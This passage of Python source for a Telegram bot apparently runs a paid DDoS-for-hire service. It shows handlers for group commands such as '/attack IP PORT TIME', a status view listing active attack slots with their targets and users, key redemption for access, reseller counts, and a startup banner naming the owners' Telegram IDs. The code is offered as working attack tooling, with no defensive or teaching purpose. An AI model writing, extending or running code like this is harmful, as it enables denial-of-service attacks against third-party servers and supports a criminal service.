        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ 🔑 You don't have active access!\n│ Use /redeem KEY in PRIVATE chat with bot", "warning"))
        return
    
    now = time.time()
    slots = []
    for attack_id, info in active_attacks.items():
        if now < info["finish_time"]:
            remaining = int(info["finish_time"] - now)
            mins = remaining // 60
            secs = remaining % 60
            time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
            slots.append(f"❌ BUSY\n    🎯 {info['target_key']}\n    👤 {info['user']}\n    ⏰ {time_str} left")
    
    status_msg = f"📊 ATTACK STATUS\n📅 {format_ist_time(get_current_ist())}\n\n"
    
    for i in range(MAX_CONCURRENT):
        if i < len(slots):
            status_msg += slots[i] + "\n\n"
        else:
            status_msg += f"✅ SLOT {i+1}: FREE\n    💡 Ready for attack\n\n"
    
    status_msg += f"📊 ACTIVE: {len(slots)}/{MAX_CONCURRENT}"
    
    bot.reply_to(msg, status_msg)

@bot.message_handler(commands=['cooldown'], func=lambda msg: msg.chat.type in ["group", "supergroup"])
def cooldown_group(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    # Check if user has access
    if not check_user_expiry(uid):
        bot.reply_to(msg, styled_msg("ACCESS DENIED", "│ 🔑 You don't have active access!\n│ Use /redeem KEY in PRIVATE chat with bot", "warning"))
        return
    
    bot.reply_to(msg, "✅ No cooldown! You can attack anytime.")

@bot.message_handler(commands=['help'], func=lambda msg: msg.chat.type in ["group", "supergroup"])
def help_group(msg):
    uid = str(msg.chat.id)
    current_time = format_ist_time(get_current_ist())
    
    if check_maintenance():
        bot.reply_to(msg, styled_msg("MAINTENANCE MODE", "│ 🔧 Bot is under maintenance!", "warning"))
        return
    
    has_access = check_user_expiry(uid)
    
    if has_access:
        content = f"""│ 📝 GROUP HELP
│
│ /attack IP PORT TIME - Launch attack (Max 300s)
│ /status - Check attack slots
│ /cooldown - Check cooldown
│ /help - This menu
│
│ 📅 {current_time}"""
        bot.reply_to(msg, styled_msg("HELP", content))
    else:
        content = f"""│ 📝 GROUP HELP
│
│ You need access to attack in this group!
│
│ Use /redeem KEY in PRIVATE chat with bot to get access
│
│ ⚡ Max Attack Time: 300s
│ 📅 {current_time}"""
        bot.reply_to(msg, styled_msg("HELP", content))

# ========== REDEEM IS NOT ALLOWED IN GROUPS - BLOCK IT ==========
@bot.message_handler(commands=['redeem'], func=lambda msg: msg.chat.type in ["group", "supergroup"])
def redeem_not_allowed(msg):
    bot.reply_to(msg, "❌ /redeem command only works in PRIVATE chat with bot!\n\nPlease use /redeem KEY in private message.")

# ========== IGNORE ALL OTHER MESSAGES ==========
@bot.message_handler(func=lambda msg: True)
def ignore_all(msg):
    # Ignore all other messages - bot will not reply
    pass

# ========== START BOT ==========
print("=" * 50)
print("✨ GROUP ATTACK BOT STARTED ✨")
print(f"👑 Owners: 8487946379, 7495474613")
print(f"💎 Resellers: {len(resellers)}")
print(f"⚡ Global Concurrent: {MAX_CONCURRENT}")
print(f"⏳ Cooldown: {COOLDOWN_TIME}s")
print(f"🚫 Blocked Ports: {BLOCKED_PORTS}")
print(f"📅 Server Time: {format_ist_time(get_current_ist())}")
print("=" * 50)

while True:
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"Bot polling error: {e}")
        time.sleep(10)
